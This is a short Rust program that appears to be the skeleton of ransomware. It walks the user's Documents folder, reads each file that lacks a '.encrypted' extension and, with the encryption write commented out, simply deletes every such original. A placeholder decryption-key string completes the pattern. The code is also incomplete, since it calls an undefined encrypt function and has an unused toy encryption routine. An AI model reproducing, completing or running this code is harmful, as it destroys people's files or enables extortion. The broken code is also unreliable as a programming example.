use chacha20poly1305::{XChaCha20Poly1305, KeyInit, aead::stream};
use dirs::home_dir;
use std::error::Error;
use std::fs::{self, File};
use std::path::PathBuf;
use std::io::prelude::*;
use anyhow::Result;
use orion::aead;

fn encrypt_file() -> Result<()> {
	let secret_key = aead::SecretKey::default();
	let ciphertext = aead::seal(&secret_key, b"Secret message")?;
	let decrypted_data = aead::open(&secret_key, &ciphertext)?;

	Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
	let encrypted_extension = ".encrypted";
	let key = "INSERT_DECRYPTION_KEY_HERE";

	let target_dir = format!(
		"{}\\Documents",
		home_dir().unwrap_or("~".into()).to_string_lossy()
	);
	println!("{}", target_dir);

	let entries = fs::read_dir(target_dir)?;
	for entry in entries {
		let path = entry?.path();

		if path.is_file() {
			let file_name = path.file_name().unwrap().to_str().unwrap();

			if !file_name.ends_with(encrypted_extension) {
				let mut file = fs::File::open(&path)?;
				let mut contents = Vec::new();
				file.read_to_end(&mut contents)?;

				let encrypted_path =
					PathBuf::from(format!("{}{}", path.display(), encrypted_extension));
				//fs::write(&encrypted_path, encrypt(&contents[..], key.as_bytes()))?;

				fs::remove_file(&path)?;
			}
		}
	}

	Ok(())
}
